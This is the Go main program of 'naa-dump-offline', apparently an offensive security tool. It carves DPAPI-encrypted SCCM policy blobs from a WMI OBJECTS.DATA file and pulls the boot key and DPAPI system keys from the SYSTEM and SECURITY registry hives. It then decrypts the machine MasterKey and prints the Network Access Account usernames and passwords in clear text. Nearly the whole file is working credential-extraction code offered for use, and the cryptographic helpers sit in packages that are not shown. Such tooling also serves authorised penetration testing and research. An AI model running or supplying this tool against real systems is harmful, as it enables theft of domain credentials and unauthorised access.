package main

import (
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/shehzade/naa-dump-offline/pkg/dpapi"
	"github.com/shehzade/naa-dump-offline/pkg/registry"
	"github.com/shehzade/naa-dump-offline/pkg/wmi"
)

const banner = `
                                __                    
   ____  ____ _____ _      ____/ /_  ______ ___  ____ 
  / __ \/ __ '/ __ '/_____/ __  / / / / __ '__ \/ __ \
 / / / / /_/ / /_/ /_____/ /_/ / /_/ / / / / / / /_/ /
/_/ /_/\__,_/\__,_/      \__,_/\__,_/_/ /_/ /_/ .___/ 
                                             /_/      
`

type JSONOutput struct {
	ObjectsFile        string              `json:"objects_file,omitempty"`
	TotalBlobs         int                 `json:"total_blobs"`
	UniqueBlobs        int                 `json:"unique_blobs"`
	RequiredMasterKeys []string            `json:"required_masterkeys,omitempty"`
	BootKey            string              `json:"bootkey,omitempty"`
	DPAPIUserKey       string              `json:"dpapi_userkey,omitempty"`
	DPAPIMachineKey    string              `json:"dpapi_machinekey,omitempty"`
	DecryptedMasterKey string              `json:"decrypted_masterkey,omitempty"`
	MasterKeySource    string              `json:"masterkey_source,omitempty"`
	Credentials        []wmi.NAACredential `json:"credentials"`
	Secrets            []*wmi.CarvedSecret `json:"secrets,omitempty"`
}

func main() {
	var (
		objectsPath = flag.String("o", "", "Path to OBJECTS.DATA file")
		objectsLong = flag.String("objects", "", "Path to OBJECTS.DATA file")
		sysPath     = flag.String("sys", "", "Path to SYSTEM registry hive")
		sysLong     = flag.String("system", "", "Path to SYSTEM registry hive")
		secPath     = flag.String("sec", "", "Path to SECURITY registry hive")
		secLong     = flag.String("security", "", "Path to SECURITY registry hive")
		mkPath      = flag.String("m", "", "Path to MasterKey file")
		mkLong      = flag.String("master-key", "", "Path to MasterKey file")
		keyHex      = flag.String("k", "", "Decrypted MasterKey in hex (optional)")
		jsonMode    = flag.Bool("json", false, "Output results in JSON format")
		verbose     = flag.Bool("v", false, "Verbose output (show decrypted policy secrets)")
	)

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "%s\n", banner)
		fmt.Fprintf(os.Stderr, "Usage: naa-dump-offline -o OBJECTS.DATA [options]\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  naa-dump-offline -o OBJECTS.DATA\n")
		fmt.Fprintf(os.Stderr, "  naa-dump-offline -o OBJECTS.DATA -sys SYSTEM -sec SECURITY -m <masterkey-file>\n")
		fmt.Fprintf(os.Stderr, "  naa-dump-offline -o OBJECTS.DATA -k <masterkey-hex>\n")
	}

	flag.Parse()

	objects := *objectsPath
	if objects == "" {
		objects = *objectsLong
	}
	system := *sysPath
	if system == "" {
		system = *sysLong
	}
	security := *secPath
	if security == "" {
		security = *secLong
	}
	masterKey := *mkPath
	if masterKey == "" {
		masterKey = *mkLong
	}

	if objects == "" {
		if *jsonMode {
			logError(true, "-o (path to OBJECTS.DATA) is required")
		} else {
			fmt.Fprintf(os.Stderr, "[!] Error: -o (path to OBJECTS.DATA) is required.\n\n")
			flag.Usage()
		}
		os.Exit(1)
	}

	if (system != "" && security == "") || (system == "" && security != "") {
		logError(*jsonMode, "Both -sys and -sec must be provided together.")
		os.Exit(1)
	}

	if masterKey != "" && (system == "" || security == "") && *keyHex == "" {
		logError(*jsonMode, "Both -sys and -sec are required when using -m.")
		os.Exit(1)
	}

	out := JSONOutput{
		ObjectsFile: objects,
		Credentials: []wmi.NAACredential{},
	}

	if !*jsonMode {
		fmt.Print(banner)
	}

	var carverRes *wmi.CarverResult
	if objects != "" {
		if !*jsonMode {
			fmt.Printf("[*] Scanning %s for encrypted policy blobs...\n", objects)
		}
		var err error
		carverRes, err = wmi.ScanObjectsData(objects)
		if err != nil {
			logError(*jsonMode, "Failed to scan OBJECTS.DATA: %v", err)
			os.Exit(1)
		}
		out.TotalBlobs = carverRes.TotalBlobs
		out.UniqueBlobs = len(carverRes.UniqueBlobs)
		out.RequiredMasterKeys = carverRes.RequiredGUIDs

		if !*jsonMode {
			fmt.Printf("[+] Found %d encrypted blobs (%d unique)\n",
				carverRes.TotalBlobs, len(carverRes.UniqueBlobs))
			for _, guid := range carverRes.RequiredGUIDs {
				count := carverRes.GUIDCounts[guid]
				fmt.Printf("    - MasterKey GUID: %s (%d blobs)\n", guid, count)
			}
		}

		if len(carverRes.UniqueBlobs) == 0 {
			if *jsonMode {
				printJSON(out)
			} else {
				fmt.Println("[-] No encrypted policy blobs found.")
			}
			return
		}
	}

	if system == "" && security == "" && *keyHex == "" {
		if !*jsonMode {
			fmt.Println("\n[*] Required MasterKey file:")
			for _, guid := range carverRes.RequiredGUIDs {
				fmt.Printf("    %%SystemRoot%%\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\%s\n", guid)
			}
		} else {
			printJSON(out)
		}
		return
	}

	var systemKeys *registry.DPAPISystemKeys
	if system != "" && security != "" {
		if !*jsonMode {
			fmt.Printf("[*] Parsing SYSTEM hive: %s\n", system)
		}
		bootKey, err := registry.GetBootKey(system)
		if err != nil {
			logError(*jsonMode, "Failed to parse BootKey: %v", err)
			os.Exit(1)
		}
		out.BootKey = fmt.Sprintf("0x%x", bootKey)
		if !*jsonMode {
			fmt.Printf("[+] BootKey: 0x%x\n", bootKey)
			fmt.Printf("[*] Parsing SECURITY hive: %s\n", security)
		}

		systemKeys, err = registry.ExtractDPAPISystemKeys(security, bootKey)
		if err != nil {
			logError(*jsonMode, "Failed to extract DPAPI_SYSTEM keys: %v", err)
			os.Exit(1)
		}

		out.DPAPIUserKey = fmt.Sprintf("0x%x", systemKeys.UserKey)
		out.DPAPIMachineKey = fmt.Sprintf("0x%x", systemKeys.MachineKey)
		if !*jsonMode {
			fmt.Printf("[+] DPAPI UserKey:    0x%x\n", systemKeys.UserKey)
			fmt.Printf("[+] DPAPI MachineKey: 0x%x\n", systemKeys.MachineKey)
		}
	}

	if masterKey == "" && *keyHex == "" {
		if !*jsonMode {
			fmt.Println("\n[*] Required MasterKey file:")
			for _, guid := range carverRes.RequiredGUIDs {
				fmt.Printf("    %%SystemRoot%%\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\%s\n", guid)
			}
		} else {
			printJSON(out)
		}
		return
	}

	masterKeysMap := make(map[string][]byte)

	if *keyHex != "" {
		rawHex := strings.TrimPrefix(strings.TrimSpace(*keyHex), "0x")
		rawKey, err := hex.DecodeString(rawHex)
		if err != nil || len(rawKey) != 64 {
			logError(*jsonMode, "Invalid -k MasterKey hex: expected 64 bytes (128 hex characters)")
			os.Exit(1)
		}
		out.DecryptedMasterKey = fmt.Sprintf("0x%x", rawKey)
		out.MasterKeySource = "User provided (-k)"
		for _, guid := range carverRes.RequiredGUIDs {
			masterKeysMap[guid] = rawKey
		}
		if !*jsonMode {
			fmt.Printf("[+] Using supplied MasterKey: 0x%x\n", rawKey)
		}
	} else if masterKey != "" {
		if !*jsonMode {
			fmt.Printf("[*] Decrypting MasterKey from %s\n", masterKey)
		}

		for _, targetGUID := range carverRes.RequiredGUIDs {
			decKey, source, err := dpapi.LoadAndDecryptMasterKey(masterKey, targetGUID, systemKeys)
			if err != nil {
				if !*jsonMode {
					fmt.Printf("[-] Could not decrypt MasterKey (%s): %v\n", targetGUID, err)
				}
				continue
			}
			masterKeysMap[targetGUID] = decKey
			out.DecryptedMasterKey = fmt.Sprintf("0x%x", decKey)
			out.MasterKeySource = source
			if !*jsonMode {
				fmt.Printf("[+] MasterKey (%s): 0x%x\n", targetGUID, decKey)
			}
		}
	}

	if len(masterKeysMap) == 0 {
		logError(*jsonMode, "No valid MasterKey could be decrypted.")
		os.Exit(1)
	}

	if !*jsonMode {
		fmt.Printf("[*] Decrypting %d policy blobs...\n", len(carverRes.UniqueBlobs))
	}

	for _, secret := range carverRes.UniqueBlobs {
		rawBytes, err := hex.DecodeString(secret.RawHex)
		if err != nil {
			continue
		}
		blobBytes := rawBytes
		if len(rawBytes) > 4 {
			blobBytes = rawBytes[4:]
		}

		blob, err := dpapi.ParseDPAPIBlob(blobBytes)
		if err != nil {
			blob, err = dpapi.ParseDPAPIBlob(rawBytes)
			if err != nil {
				continue
			}
		}

		decMK, ok := masterKeysMap[blob.GuidMasterKey]
		if !ok {
			for _, k := range masterKeysMap {
				decMK = k
				break
			}
		}

		decrypted, err := blob.Decrypt(decMK)
		if err != nil {
			continue
		}

		secret.DecryptedBytes = decrypted
		text, isEmpty := wmi.ParseDecryptedPayload(decrypted)
		secret.DecryptedText = text
		secret.IsEmpty = isEmpty
	}

	creds := wmi.ExtractCredentialsFromSecrets(carverRes.UniqueBlobs)
	out.Credentials = creds
	if *verbose {
		out.Secrets = carverRes.UniqueBlobs
	}

	if *jsonMode {
		printJSON(out)
		return
	}

	if len(creds) == 0 {
		hasRemoved := false
		for _, s := range carverRes.UniqueBlobs {
			if s.IsEmpty {
				hasRemoved = true
				break
			}
		}
		if hasRemoved {
			fmt.Println("[-] Found NAA policy entries, but credentials were cleared/empty in site configuration")
		} else {
			fmt.Println("[-] No NAA credentials found in decrypted policy blobs")
		}
	} else {
		fmt.Println("\n[+] Extracted credentials:")
		for _, c := range creds {
			fmt.Printf("    %s:%s\n", c.Username, c.Password)
		}
	}

	if *verbose {
		fmt.Println("\n[*] Verbose payload dump:")
		for _, s := range carverRes.UniqueBlobs {
			fmt.Printf("\n--- Secret #%d (Offset: 0x%x, MasterKey: %s, Context: %s) ---\n",
				s.Index, s.Offset, s.MasterKeyGUID, s.Context)
			if s.IsEmpty {
				fmt.Println("[EMPTY]")
			} else {
				fmt.Println(s.DecryptedText)
			}
		}
	}
}

func logError(jsonMode bool, format string, a ...interface{}) {
	msg := fmt.Sprintf(format, a...)
	if jsonMode {
		errObj := map[string]string{"error": msg}
		b, _ := json.Marshal(errObj)
		fmt.Println(string(b))
	} else {
		fmt.Fprintf(os.Stderr, "[!] Error: %s\n", msg)
	}
}

func printJSON(v interface{}) {
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		fmt.Fprintf(os.Stderr, `{"error":"json marshal error"}`)
		return
	}
	fmt.Println(string(b))
}
